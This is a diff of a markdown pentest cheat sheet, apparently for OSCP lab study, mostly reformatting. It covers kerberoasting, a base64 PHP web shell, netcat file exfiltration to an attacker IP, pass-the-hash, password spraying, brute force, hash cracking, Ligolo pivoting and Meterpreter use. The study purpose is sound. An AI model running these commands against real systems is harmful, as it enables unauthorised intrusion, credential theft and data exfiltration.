@@ -157,6 +157,7 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
 - Note that there are seclists with common community strings
 	- SecLists/Miscellaneous/wordlist-common-snmp-community-strings.txt
 	- SecLists/Miscellaneous/snmp.txt
+
 <br>
 ### snmpwalk
 - snmpwalk -c public -v1 -t 10 \<target ip>
@@ -226,9 +227,9 @@ Get-History - may not work
 <br>
 
 ### Auto Tools
-./winpeas.exe
-./adPEAS.ps1
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
+- ./winpeas.exe
+- ./adPEAS.ps1
+- powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 
 <br>
 ## Active Directory (https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
@@ -259,11 +260,10 @@ powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 - cat \\\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml
           - gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ### Rubeus usage
-          .\Rubeus.exe asreproast /nowrap
-          #Displays the vulnerable user and their AS-REP hash
-          .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
-          # Displays the vulnerable user and their TGS-REP hash
+- .\Rubeus.exe asreproast /nowrap (Displays the vulnerable user and their AS-REP hash)
+- .\Rubeus.exe kerberoast /outfile:hashes.kerberoast (Displays the vulnerable user and their TGS-REP hash)
 <br>
+
 ## Privilege Escalation
 <br>
 ### Mimikatz
@@ -330,28 +330,29 @@ OR
 **Basic usage**
 <br>
 From Kali:
-- sudo ip tuntap add user pop mode tun ligolo
-- sudo ip link set ligolo up
-- sudo ip route add \<target ip.0/24> dev ligolo
-- ./proxy -selfcert
+1. sudo ip tuntap add user pop mode tun ligolo
+2. sudo ip link set ligolo up
+3. sudo ip route add \<target ip.0/24> dev ligolo
+4. ./proxy -selfcert
 <br>
 From Windows Target (agent file):
-- .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
+1. .\ligolo.exe -connect \<kali IP>:11601 -ignore-cert
 <br>
 From Linux Target (agent file):
-- ligolo -connect \<kali IP>:11601 -ignore-cert
+1. ligolo -connect \<kali IP>:11601 -ignore-cert
 <br>
 Then from Kali:
-- Session
-- 1
-- Start
-- listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
+1. Session
+2. 1
+3. Start
+4. listener_add --addr 0.0.0.0:5555 --to 127.0.0.1:6666
 	- This allows you to access port 5555 on target from 127.0.0.1:6666 (kali machine). 
 <br>
  **Local Port Forwarding:**
 	- `ip route add 240.0.0.1/32 dev`
-	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on.
+	- **240.0.0.1** will point to whatever machine Ligolo-ng has an active tunnel on. If there is an internal web server on port 5555, it can be accessed from kali on 240.0.0.1:5555
 <br>
+
 ## Other tools
 While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I found that [Ligolo-ng](https://github.com/nicocha30/ligolo-ng/releases) was about to provide all of the same functionality and more simply. That said, I am linking a guide discusess the other tools. Here is frankyyano's [Pivoting & Tunneling guide](https://medium.com/@frankyyano/pivoting-tunneling-for-oscp-and-beyond-33a57dd6dc69). 
 
@@ -363,12 +364,14 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 - From target Linux:
 	- wget http://\<kali IP>:\<serving port>/file
 <br>
-### Over NC
-- on target: nc -w 3 192.168.45.230 4444 < file.txt
-   on kali: nc -lvnp 4444 > file.txt
+
+### Over nc
+1. on target: nc -w 3 192.168.45.230 4444 < file.txt
+2. on kali: nc -lvnp 4444 > file.txt
 ### Over RDP
-- xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:\/<directory>,\<name>
+- xfreerdp /u:admin /p:password /v:10.10.172.151 /drive:/directory, $sharename
 <br>
+
 ### SMB
 - From kali: 
 	- sudo impacket-smbserver -smb2support share . -username <kali user> -password <kali pass>
@@ -376,12 +379,13 @@ While the OSCP Lab discusess other tools such as socat, sshuttle, and plink, I f
 	- net use m: \\\<kali IP>\share /user:<kali user> <kali pass>
 	- copy/get file.txt m:\
 <br>
+
 ### SSH/SCP
-scp -P \<ssh port> \<file to copy> user@\<destination IP>:\<destination folder>
+scp -P $SSHport $filetocopy user@$destIP:$destFolder
 <br>
 
 ### wsgidav
-wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to share>
+wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root $directoryToShare
 - host specifies the host to listen to, "0.0.0.0" means all interaces, "--auth=anonymous" disables authentication (fine for sharing specific files during this context), and the "--root" flag specifies the directory to share. 
 
 
@@ -390,14 +394,14 @@ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /<directory you want to
 nxc smb $IP -u $user -p '$password' -d domain.com --continue-on-success
 
 ## Kerbrute
-.\kerbrute_windows_amd64.exe passwordspray -d domain.com .\usernames.txt "<password>"
+.\kerbrute_windows_amd64.exe passwordspray -d domain.com $usersfile "$password"
 
 ## Impacket
 ### mssqlclient
 impacket-mssqlclient \<user>:\<pass>@\<target> -windows-auth
 ### psexec 
 ### wmiexec
-- impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@/<target> (can be 0/24)
+- impacket-wmiexec -hashes :$NTLMhash Administrator@$target (can be 0/24)
 	- Requires an SMB connection through the firewall, the Windows File and Printer Sharing feature must be enabled, and the admin share called ADMIN$ must be available. 
 <br>
 
@@ -439,10 +443,10 @@ Payloads (msfvenom)
 - idletime (meterpreter) - check that user's idletme
 - shell - switch to shell
   - whoami /priv 
-- getuid - check user *from meterpreter*
+- getuid - check user (*from meterpreter*)
 - getsystem - elevate privileges from meterpreter
 - ps 
-  - then migrate <PID> (check to see if other users are running it)
+  - then migrate $PID (check to see if other users are running it)
   - execute -H -f notepad
     - -H = hidden, -f = program
 - Check Integrity Level of current process:
@@ -460,22 +464,22 @@ Payloads (msfvenom)
 
 ## Password Attacks
 ### Hydra
-- hydra -l \<user> -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
-- hydra -L /usr/share/wordlists/dirb/others/names.txt -p "\<found password>" rdp://$IP
-- hydra -l \<user>-P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
+- hydra -l $user -P /usr/share/wordlists/rockyou.txt -s \<alternate port> ssh://$IP
+- hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$knownPass" rdp://$IP
+- hydra -l $user -P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"
 - Basic Auth
 	- hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.206.201 http-get
 <br>
 ### Hashcat
-- hashcat -m 0 \<hashfile> /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
-- hashcat -m 13400 \<keepass hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
+- hashcat -m 0 $hashFile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show
+- hashcat -m 13400 $keepassHash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show
 - check hashcat for which mode to use (searching for KeePass in this case)
 	- hashcat --help \| grep -i "KeePass" 
 	- hashcat -h \| grep -i "ssh"
 <br>
 ### john the ripper
 - ssh2john id_rsa > ssh.hash 
-- keepass2john \<database_name>.kdbx > keepass1.hash
+- keepass2john $dbName.kdbx > keepass1.hash
 <br>
 ## ssh
 
@@ -498,7 +502,7 @@ Payloads (msfvenom)
 <br>
 ## Wordpress Cheatsheet
 ### wpscan
-- wpscan --url http://\<url> --api-token \<APItoken>
+- wpscan --url http://$URL --api-token $APIToken
 ### reverse shell Wordpress plugin
 
 	    <?php
